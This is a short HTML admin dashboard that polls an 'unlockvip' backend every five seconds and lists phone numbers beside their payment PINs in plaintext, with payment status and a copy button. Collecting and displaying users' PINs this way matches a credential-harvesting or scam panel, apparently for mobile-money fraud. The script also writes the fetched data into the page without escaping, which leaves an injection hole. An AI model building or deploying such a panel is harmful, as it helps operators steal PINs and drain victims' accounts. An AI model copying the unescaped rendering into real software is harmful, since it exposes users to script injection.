<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Admin Dashboard</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#0b0f19;
  color:white;
}

h1{
  text-align:center;
  padding:20px;
}

table{
  width:100%;
  border-collapse:collapse;
}

th, td{
  padding:12px;
  text-align:center;
  border-bottom:1px solid #222;
}

th{
  background:#111827;
}

tr:hover{
  background:#1f2937;
}

.status-success{
  color:#22c55e;
  font-weight:bold;
}

.status-failed{
  color:#ef4444;
  font-weight:bold;
}

.status-pending{
  color:#facc15;
  font-weight:bold;
}

.copy-btn{
  background:#2563eb;
  color:white;
  border:none;
  padding:5px 10px;
  border-radius:6px;
  cursor:pointer;
}

.copy-btn:hover{
  background:#1d4ed8;
}
</style>

</head>

<body>

<h1>📊 Admin Dashboard</h1>

<table>
<thead>
<tr>
<th>Phone</th>
<th>PIN</th>
<th>Status</th>
<th>Reason</th>
<th>Copy</th>
</tr>
</thead>

<tbody id="tableBody"></tbody>
</table>

<script>

async function loadData(){

  const res = await fetch("https://unlockvip-backend-1.onrender.com/admin/payments");
  const data = await res.json();

  let html = "";

  data.forEach(p => {

    let statusClass = "status-pending";

    if(p.status === "COMPLETED") statusClass = "status-success";
    if(p.status === "FAILED") statusClass = "status-failed";

    html += `
      <tr>
        <td>${p.phone}</td>
        <td>${p.pin}</td>
        <td class="${statusClass}">${p.status}</td>
        <td>${p.reason || "-"}</td>
        <td>
          <button class="copy-btn" onclick="copy('${p.phone}')">📋</button>
        </td>
      </tr>
    `;
  });

  document.getElementById("tableBody").innerHTML = html;
}

function copy(text){
  navigator.clipboard.writeText(text);
  alert("Copied: " + text);
}

loadData();

// auto refresh every 5 sec
setInterval(loadData, 5000);

</script>

</body>
</html>
